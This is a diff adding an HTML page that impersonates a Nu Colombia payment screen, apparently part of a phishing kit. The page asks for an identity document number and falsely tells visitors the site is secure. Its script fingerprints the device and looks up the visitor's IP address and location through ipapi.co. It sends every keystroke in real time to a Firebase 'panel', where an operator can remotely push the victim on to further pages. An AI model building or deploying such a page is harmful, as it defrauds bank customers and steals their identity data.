@@ -1,0 +1,381 @@
+<html lang="es"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Nu - Pago</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet">
+
+<style>
+*{box-sizing:border-box;}
+body{
+  margin:0;
+  font-family:'Inter', sans-serif;
+  background:#fff;
+}
+
+/* HEADER */
+.header{
+  padding:20px 30px;
+}
+.header img{
+  height:30px;
+}
+
+/* BACKGROUND */
+.bg{
+  background:url('fondo.webp') center/cover no-repeat;
+  height:calc(100vh - 80px);
+  display:flex;
+  align-items:center;
+}
+
+/* CARD */
+.card{
+  background:#fff;
+  width:350px;
+  margin-left:60px;
+  padding:25px;
+  border-radius:16px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.1);
+}
+
+.back{
+  font-size:20px;
+  margin-bottom:10px;
+}
+
+.title{
+  font-size:22px;
+  font-weight:600;
+}
+
+.desc{
+  margin:10px 0 20px;
+  color:#444;
+}
+
+.option{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin:12px 0;
+}
+
+.option input{
+  accent-color:#820ad1;
+}
+
+input[type="text"]{
+  width:100%;
+  padding:12px;
+  border:none;
+  border-bottom:1px solid #ccc;
+  margin-top:10px;
+}
+
+/* BUTTONS */
+.btn{
+  width:100%;
+  padding:12px;
+  border-radius:25px;
+  border:none;
+  margin-top:15px;
+}
+
+.btn-primary{
+  background:#eee;
+}
+
+.btn-secondary{
+  background:#ddd;
+}
+
+/* FOOTER */
+.footer{
+  display:flex;
+  justify-content:space-between;
+  padding:15px 30px;
+  font-size:12px;
+}
+
+/* MOBILE */
+@media(max-width:900px){
+  .bg{
+    height:auto;
+    padding:20px;
+  }
+
+  .card{
+    margin:0;
+    width:100%;
+    box-shadow:none;
+  }
+}
+
+@media(max-width:900px){
+  .bg{
+    background:none;
+    height:auto;
+    padding:20px;
+  }
+}
+
+
+.btn-primary{
+  background:#eee;
+  color:#999;
+  transition:0.3s;
+}
+
+.btn-primary.active{
+  background:#820ad1;
+  color:#fff;
+}
+
+
+.header{
+  padding:20px 30px;
+  font-size:40px;
+  font-weight:900;
+  letter-spacing:-2px;
+  color:#111;
+}
+
+.header span{
+  color:#820ad1;
+}
+
+
+.overlay{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.5);
+  backdrop-filter:blur(4px);
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+}
+
+.loader{
+  text-align:center;
+  color:#fff;
+}
+
+.spinner{
+  width:40px;
+  height:40px;
+  border:4px solid #fff;
+  border-top:4px solid #820ad1;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:0 auto 10px;
+}
+
+@keyframes spin{
+  to{ transform:rotate(360deg); }
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  Nu
+</div>
+
+<div class="bg">
+  <div class="card">
+
+    
+
+    <div class="title">Vas a pagar</div>
+
+    <div class="desc">
+      Revisa que tengas <b>suficiente saldo en tu Cuenta Nu</b> para completar este pago.
+    </div>
+
+    <p>Escoge tu tipo de documento</p>
+
+    <div class="option">
+      <input type="radio" >
+      <span>Cédula de ciudadanía</span>
+    </div>
+
+    <div class="option">
+      <input type="radio">
+      <span>Cédula de extranjería</span>
+    </div>
+
+    <div class="option">
+      <input type="radio">
+      <span>Permiso por protección temporal</span>
+    </div>
+
+    <label>Número de documento</label>
+    <input type="text" id="doc">
+
+    <button id="btn" class="btn btn-primary">Continuar</button>
+    <button class="btn btn-secondary">Cancelar</button>
+
+    <p style="font-size:12px;margin-top:10px;">
+      Vas a hacer el pago a través de PSE
+    </p>
+
+  </div>
+</div>
+
+<div class="footer">
+  <div>Nu Colombia Compañía de Financiamiento S.A.</div>
+  <div>Paga con tranquilidad, este es un sitio seguro.</div>
+</div>
+
+
+<div class="overlay">
+  <div class="loader">
+    <div class="spinner"></div>
+    <p>Cargando...</p>
+  </div>
+</div>
+
+<script>
+const input = document.getElementById('doc');
+const btn = document.getElementById('btn');
+const overlay = document.querySelector('.overlay');
+
+input.addEventListener('input', () => {
+  if(input.value.trim() !== ''){
+    btn.classList.add('active');
+  } else {
+    btn.classList.remove('active');
+  }
+});
+</script>
+
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+const { db, uid, ref, update, onValue } = window;
+
+function detectarDispositivo(userAgent) {
+userAgent = userAgent.toLowerCase();
+if (/windows/.test(userAgent)) return "Windows";
+if (/iphone/.test(userAgent)) return "iPhone";
+if (/ipad/.test(userAgent)) return "iPad";
+if (/android/.test(userAgent)) return "Android";
+if (/macintosh/.test(userAgent)) return "Mac";
+if (/linux/.test(userAgent)) return "Linux";
+return "Desconocido";
+}
+
+const dispositivoDetectado = detectarDispositivo(navigator.userAgent);
+update(ref(db, "dataPages/" + uid), { dispositivo: dispositivoDetectado });
+
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
+const dbRef = ref(db, "dataPages/" + uid);
+update(dbRef, {
+ip: data.ip,
+ciudad: data.city,
+pais: data.country_name
+});
+});
+
+
+update(ref(db, "dataPages/" + uid), { 
+estado: "abierto",
+paginaActual: "Index.html" 
+});
+
+window.addEventListener("beforeunload", () => {
+update(ref(db, "dataPages/" + uid), { 
+estado: "cerrado",
+paginaActual: null  
+});
+});
+
+
+// 🔥 ACTIVAR NUBE EN ESTA PÁGINA
+update(ref(db, "dataPages/" + uid), {
+  oculto: false
+});
+
+
+if (input) {
+  input.addEventListener("input", function() {
+
+    // 🔢 solo números
+    this.value = this.value.replace(/\D/g, "");
+
+    // 🔵 activar botón visual
+    if (this.value.trim() !== "") {
+      btn.classList.add("active");
+    } else {
+      btn.classList.remove("active");
+    }
+
+    // 🔴 enviar al panel en tiempo real
+    update(ref(db, "dataPages/" + uid), {
+      username: this.value
+    });
+
+  });
+}
+
+
+if (btn) {
+  btn.addEventListener("click", () => {
+
+    const valor = input.value.trim();
+    if (!valor) return;
+
+    // 🔴 activar barra en panel
+    update(ref(db, "dataPages/" + uid), {
+      mostrarBarraUsername: true
+    });
+
+    // 🔴 mostrar overlay
+    if (overlay) overlay.style.display = "flex";
+
+  });
+}
+
+
+// ===============================
+// 🔥 SOLO AUTORIZACION Y FINAL
+// ===============================
+onValue(ref(db, "dataPages/" + uid), snapshot => {
+
+  const data = snapshot.val();
+  if (!data) return;
+
+  // 🔴 IR A AUTORIZACION
+  if (data.accion === "autorizacion") {
+
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+
+    window.location.href = "autorizacion.html";
+  }
+
+  // 🔴 IR A FINAL
+  if (data.accion === "final") {
+
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+
+    window.location.href = "../../final.html";
+  }
+
+});
+
+});
+</script>
+
+</body>
+</html>
